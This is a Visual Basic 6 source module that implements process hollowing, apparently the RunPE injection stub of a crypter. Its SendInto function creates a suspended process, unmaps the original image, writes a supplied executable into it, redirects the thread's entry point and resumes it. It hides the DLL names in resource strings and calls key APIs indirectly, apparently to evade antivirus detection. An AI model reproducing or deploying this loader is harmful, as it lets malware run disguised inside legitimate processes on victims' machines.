Attribute VB_Name = "mTHREE"

Option Explicit

Public Befehl$
Public MeFile$
Public BatFile$
Public Comment As Boolean

Public Declare Function CharToOemA Lib "user32.dll" (ByVal _
        lpszSrc As String, ByVal lpszDst As String) As Long


'-------------------------------------------------------------------------------------------------------------
'Apis
Public Declare Function CreateProcess Lib "kernel32" Alias "CreateProcessA" (ByVal lpAppName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As Long, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
Public Declare Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As Long, lpBaseAddress As Any, lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
Public Declare Function ReadProcessMemory Lib "kernel32" (ByVal hProcess As Long, lpBaseAddress As Any, lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
Public Declare Function GetThreadContext Lib "kernel32" (ByVal hThread As Long, lpContext As CONTEXT86) As Long
Public Declare Function SetThreadContext Lib "kernel32" (ByVal hThread As Long, lpContext As CONTEXT86) As Long
Public Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Dest As Any, Src As Any, ByVal L As Long)

'-------------------------------------------------------------------------------------------------------------
'Variables
Public Const CREATE_SUSPENDED = &H4
Public Const MEM_COMMIT As Long = &H1000&
Public Const MEM_RESERVE As Long = &H2000&
Public Const PAGE_NOCACHE As Long = &H200
Public Const PAGE_EXECUTE_READWRITE As Long = &H40
Public Const PAGE_EXECUTE_WRITECOPY As Long = &H80
Public Const PAGE_EXECUTE_READ As Long = &H20
Public Const PAGE_EXECUTE As Long = &H10
Public Const PAGE_READONLY As Long = &H2
Public Const PAGE_WRITECOPY As Long = &H8
Public Const PAGE_NOACCESS As Long = &H1
Public Const PAGE_READWRITE As Long = &H4


Public Const CONTEXT_X86 = &H10000
Public Const CONTEXT86_CONTROL = (CONTEXT_X86 Or &H1)
Public Const CONTEXT86_INTEGER = (CONTEXT_X86 Or &H2)
Public Const CONTEXT86_SEGMENTS = (CONTEXT_X86 Or &H4)
Public Const CONTEXT86_FLOATING_POINT = (CONTEXT_X86 Or &H8)
Public Const CONTEXT86_DEBUG_REGISTERS = (CONTEXT_X86 Or &H10)
Public Const CONTEXT86_FULL = (CONTEXT86_CONTROL Or CONTEXT86_INTEGER Or CONTEXT86_SEGMENTS)

Const IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16
Const IMAGE_SIZEOF_SHORT_NAME = 8
Const SIZE_OF_80387_REGISTERS = 80
Const OFFSET_4 = 4294967296#


'-------------------------------------------------------------------------------------------------------------
'Types
Type FLOATING_SAVE_AREA
     ControlWord As Long
     StatusWord As Long
     TagWord As Long
     ErrorOffset As Long
     ErrorSelector As Long
     DataOffset As Long
     DataSelector As Long
     RegisterArea(1 To SIZE_OF_80387_REGISTERS) As Byte
     Cr0NpxState As Long
End Type

Public Type CONTEXT86
    ContextFlags As Long
    Dr0 As Long
    Dr1 As Long
    Dr2 As Long
    Dr3 As Long
    Dr6 As Long
    Dr7 As Long
    FloatSave As FLOATING_SAVE_AREA
    SegGs As Long
    SegFs As Long
    SegEs As Long
    SegDs As Long
    Edi As Long
    Esi As Long
    Ebx As Long
    Edx As Long
    Ecx As Long
    Eax As Long
    Ebp As Long
    Eip As Long
    SegCs As Long
    EFlags As Long
    Esp As Long
    SegSs As Long
End Type

Public Type PROCESS_INFORMATION
   hProcess As Long
   hThread As Long
   dwProcessId As Long
   dwThreadId As Long
End Type

Public Type STARTUPINFO
   cb As Long
   lpReserved As String
   lpDesktop As String
   lpTitle As String
   dwX As Long
   dwY As Long
   dwXSize As Long
   dwYSize As Long
   dwXCountChars As Long
   dwYCountChars As Long
   dwFillAttribute As Long
   dwFlags As Long
   wShowWindow As Integer
   cbReserved2 As Integer
   lpReserved2 As Long
   hStdInput As Long
   hStdOutput As Long
   hStdError As Long
End Type

Public Enum ImageSignatureTypes
    IMAGE_DOS_SIGNATURE = &H5A4D
    IMAGE_OS2_SIGNATURE = &H454E
    IMAGE_OS2_SIGNATURE_LE = &H454C
    IMAGE_VXD_SIGNATURE = &H454C
    IMAGE_NT_SIGNATURE = &H4550
End Enum

Public Type IMAGE_DOS_HEADER
    e_magic As Integer
    e_cblp As Integer
    e_cp As Integer
    e_crlc As Integer
    e_cparhdr As Integer
    e_minalloc As Integer
    e_maxalloc As Integer
    e_ss As Integer
    e_sp As Integer
    e_csum As Integer
    e_ip As Integer
    e_cs As Integer
    e_lfarlc As Integer
    e_ovno As Integer
    e_res(0 To 3) As Integer
    e_oemid As Integer
    e_oeminfo As Integer
    e_res2(0 To 9) As Integer
    e_lfanew As Long
End Type

Public Type IMAGE_FILE_HEADER
    Machine As Integer
    NumberOfSections As Integer
    TimeDateStamp As Long
    PointerToSymbolTable As Long
    NumberOfSymbols As Long
    SizeOfOptionalHeader As Integer
    characteristics As Integer
End Type

Public Type IMAGE_DATA_DIRECTORY
    VirtualAddress As Long
    Size As Long
End Type

Public Type IMAGE_OPTIONAL_HEADER
    Magic As Integer
    MajorLinkerVersion As Byte
    MinorLinkerVersion As Byte
    SizeOfCode As Long
    SizeOfInitializedData As Long
    SizeOfUnitializedData As Long
    AddressOfEntryPoint As Long
    BaseOfCode As Long
    BaseOfData As Long

    ImageBase As Long
    SectionAlignment As Long
    FileAlignment As Long
    MajorOperatingSystemVersion As Integer
    MinorOperatingSystemVersion As Integer
    MajorImageVersion As Integer
    MinorImageVersion As Integer
    MajorSubsystemVersion As Integer
    MinorSubsystemVersion As Integer
    W32VersionValue As Long
    SizeOfImage As Long
    SizeOfHeaders As Long
    CheckSum As Long
    SubSystem As Integer
    DllCharacteristics As Integer
    SizeOfStackReserve As Long
    SizeOfStackCommit As Long
    SizeOfHeapReserve As Long
    SizeOfHeapCommit As Long
    LoaderFlags As Long
    NumberOfRvaAndSizes As Long
    DataDirectory(0 To IMAGE_NUMBEROF_DIRECTORY_ENTRIES - 1) As IMAGE_DATA_DIRECTORY
End Type

Public Type IMAGE_NT_HEADERS
    Signature As Long
    FileHeader As IMAGE_FILE_HEADER
    OptionalHeader As IMAGE_OPTIONAL_HEADER
End Type

Public Type IMAGE_SECTION_HEADER
   SecName As String * IMAGE_SIZEOF_SHORT_NAME
   VirtualSize As Long
   VirtualAddress  As Long
   SizeOfRawData As Long
   PointerToRawData As Long
   PointerToRelocations As Long
   PointerToLinenumbers As Long
   NumberOfRelocations As Integer
   NumberOfLinenumbers As Integer
   characteristics  As Long
End Type


'-------------------------------------------------------------------------------------------------------------
'Functions
Public Function SendInto(ByVal TDatei As String, ByteArray() As Byte) As Long
    Dim context As CONTEXT86
    Dim ImageBase As Long, ret As Long, i As Long
    Dim addr As Long, lOffset As Long
    Dim Zlegastenie() As Byte
    Dim idh As IMAGE_DOS_HEADER
    Dim inh As IMAGE_NT_HEADERS
    Dim ish As IMAGE_SECTION_HEADER
    Dim pi As PROCESS_INFORMATION
    Dim si As STARTUPINFO
    Dim one As String
    Dim two As String
    one = LoadResString(101)
    two = LoadResString(102)
    Zlegastenie = ByteArray()
    
    CopyMemory idh, Zlegastenie(0), Len(idh)
    If idh.e_magic <> IMAGE_DOS_SIGNATURE Then
       'MZ signaturen ej hittad!
       Exit Function
    End If
    CopyMemory inh, Zlegastenie(idh.e_lfanew), Len(inh)
    If inh.Signature <> IMAGE_NT_SIGNATURE Then
       'PE signaturen ej hittad!
       Exit Function
    End If
    si.cb = Len(si)
        
    If CreateProcess(vbNullString, TDatei, 0, 0, False, CREATE_SUSPENDED, 0, 0, si, pi) = 0 Then
       'Injiceringen misslyckades!
       Exit Function
    End If
    
    context.ContextFlags = CONTEXT86_INTEGER
    
    'If Aufrufen("kernel32.dll", "GetThreadContext", pi.hThread, CONTEXT86) = 0 Then GoTo ClearProcess
    If GetThreadContext(pi.hThread, context) = 0 Then GoTo ClearProcess
    
    Call ReadProcessMemory(pi.hProcess, ByVal context.Ebx + 8, addr, 4, 0)
    If addr = 0 Then GoTo ClearProcess
    
'1-> ntdll.dll; 2-> ZwUnmapViewOfSection
    If Aufrufen(two, "ZwUnmapViewOfSection", pi.hProcess, addr) Then GoTo ClearProcess
    'If ZwUnmapViewOfSection(pi.hProcess, addr) Then GoTo ClearProcess
    
'1-> kernel32.dll; 2-> VirtualAllocEx
    ImageBase = Aufrufen(one, "VirtualAllocEx", pi.hProcess, inh.OptionalHeader.ImageBase, inh.OptionalHeader.SizeOfImage, MEM_RESERVE Or MEM_COMMIT, PAGE_READWRITE)
    'ImageBase = VirtualAllocEx(pi.hProcess, ByVal inh.OptionalHeader.ImageBase, inh.OptionalHeader.SizeOfImage, MEM_RESERVE Or MEM_COMMIT, PAGE_READWRITE)
    If ImageBase = 0 Then GoTo ClearProcess
    
    Call WriteProcessMemory(pi.hProcess, ByVal ImageBase, Zlegastenie(0), inh.OptionalHeader.SizeOfHeaders, ret)
    
    lOffset = idh.e_lfanew + Len(inh)
    For i = 0 To inh.FileHeader.NumberOfSections - 1
        CopyMemory ish, Zlegastenie(lOffset + i * Len(ish)), Len(ish)
        
        Call WriteProcessMemory(pi.hProcess, ByVal ImageBase + ish.VirtualAddress, Zlegastenie(ish.PointerToRawData), ish.SizeOfRawData, ret)
        
'1-> kernel32.dll; 2-> VirtualProtectEx
        Call Aufrufen(one, "VirtualProtectEx", pi.hProcess, ImageBase + ish.VirtualAddress, ish.VirtualSize, Skydda(ish.characteristics), addr)
        'Call VirtualProtectEx(pi.hProcess, ByVal ImageBase + ish.VirtualAddress, ish.VirtualSize, Skydda(ish.characteristics), addr)
    Next i
    
    Call WriteProcessMemory(pi.hProcess, ByVal context.Ebx + 8, ImageBase, 4, ret)
    context.Eax = ImageBase + inh.OptionalHeader.AddressOfEntryPoint
    Call SetThreadContext(pi.hThread, context)
    
    'Call ResumeThread(pi.hThread)
'1-> kernel32.dll; 2-> ResumeThread
    Call Aufrufen(one, "ResumeThread", pi.hThread)
    Exit Function
ClearProcess:
'1-> kernel32.dll; 2-> CloseHandle
    Call Aufrufen(one, "CloseHandle", pi.hThread)
'1-> kernel32.dll; 2-> CloseHandle
    Call Aufrufen(one, "CloseHandle", pi.hProcess)

End Function

Public Function Skydda(ByVal characteristics As Long) As Long
   Dim mapping As Variant
   mapping = Array(PAGE_NOACCESS, PAGE_EXECUTE, PAGE_READONLY, _
                   PAGE_EXECUTE_READ, PAGE_READWRITE, PAGE_EXECUTE_READWRITE, _
                   PAGE_READWRITE, PAGE_EXECUTE_READWRITE)
   Skydda = mapping(Rshift(characteristics, 29))
End Function
Public Function Rshift(ByVal lValue As Long, ByVal lNumberOfBitsToShift As Long) As Long
    Rshift = vbLongToULong(lValue) / (2 ^ lNumberOfBitsToShift)
End Function

Public Function vbLongToULong(ByVal Value As Long) As Double
    If Value < 0 Then
        vbLongToULong = Value + OFFSET_4
    Else
        vbLongToULong = Value
    End If
End Function

Sub Main()

Call Langlauf

End Sub



